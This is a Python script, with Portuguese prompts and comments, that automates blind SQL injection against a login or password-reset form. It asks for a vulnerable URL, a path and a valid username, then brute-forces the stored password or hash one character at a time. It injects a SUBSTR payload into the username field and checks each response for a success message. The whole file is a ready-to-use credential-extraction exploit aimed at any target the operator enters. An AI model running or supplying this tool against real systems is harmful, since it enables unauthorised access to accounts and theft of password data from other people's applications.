import string
import requests
import time

def get_user_input():
    """Solicita ao usuário informações necessárias."""
    url = input("Qual é a URL vulnerável a SQLi? ")
    path = input("Qual é o path vulnerável a SQLi? ")
    username = input("Qual é o nome do usuário válido? ")
    return f'{url}/{path}', username

def extract_password(url, username):
    """Extrai a senha por meio de SQL Injection Blind."""
    CHARSET = string.ascii_letters + string.digits + "_"
    SUCCESS = 'Successfully sent password'
    PAYLOAD = "' AND SUBSTR(password,{},1)='{}' -- -"
    password = ''
    
    print(f'Testando caracteres para o usuário válido: {username}')
    
    with requests.Session() as session:
        while True:
            for char in CHARSET:
                password_i = len(password) + 1
                print(f'\r[+] Testando posição {password_i} com caractere: {char}', end='')
                time.sleep(0.1)  # Pequena pausa para indicar atividade
                resp = session.post(url, data={'username': username + PAYLOAD.format(password_i, char)})
                
                if SUCCESS in resp.text:
                    password += char
                    print(f' - Caractere encontrado: {char}')
                    break
            else:
                print('\nExtração finalizada.')
                break
    return password

def main():
    """Função principal que orquestra as etapas."""
    print("=== SQL Injection Blind - Extrator de Senha ===")
    url, username = get_user_input()
    
    print(f'Iniciando extração de senha para o usuário: {username}')
    password = extract_password(url, username)
    
    print(f'\nA hash da senha do usuário é: {password}')

if __name__ == '__main__':
    main()


